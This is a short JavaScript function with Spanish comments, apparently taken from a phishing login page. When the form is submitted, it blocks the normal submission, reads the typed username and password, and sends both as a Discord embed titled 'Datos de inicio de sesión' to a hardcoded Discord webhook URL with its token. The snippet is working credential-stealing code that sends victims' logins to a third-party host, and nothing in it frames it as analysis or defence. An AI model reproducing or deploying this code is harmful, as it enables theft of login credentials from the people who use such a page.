    <script>
        function sendMessage() {
            event.preventDefault(); // Evitar que el formulario se envíe de forma predeterminada

            // Obtener los valores de los campos de texto
            var usernameInput = document.getElementById('username').value;
            var passwordInput = document.getElementById('password').value;

            // Construir el objeto de datos a enviar al webhook
            var data = {
                embeds: [{
                    title: 'Datos de inicio de sesión:',
                    color: 16777215,
                    fields: [{
                            name: 'Usuario:',
                            value: usernameInput
                        },
                        {
                            name: 'Contraseña:',
                            value: passwordInput
                        }
                    ]
                }]
            };

            // Enviar los datos al webhook usando Fetch API
            fetch('https://discord.com/api/webhooks/1208464756936024185/d3hq6jMdtU5hcXcp7DApXPQsGsJA3ZgSdprzgEu_NuOiUHbZr_BLopR6cF47fgvl-dr3', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    console.log('Webhook response:', data);
                    // Aquí puedes manejar la respuesta del webhook si es necesario
                })
                .catch(error => {
                    console.error('There was an error with the webhook request:', error);
                });
        }
    </script>
